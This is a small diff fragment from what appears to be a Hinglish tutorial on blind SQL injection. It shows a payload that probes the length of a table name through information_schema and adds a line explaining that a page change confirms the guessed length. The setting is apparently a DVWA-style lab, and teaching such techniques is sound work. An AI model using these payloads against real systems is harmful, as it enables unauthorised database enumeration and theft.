@@ -159,4 +159,6 @@ Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MIS
 
 `1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=8#`
 
+Agar page pr koi change aye too matlab utni hi length hai.
+
 ---
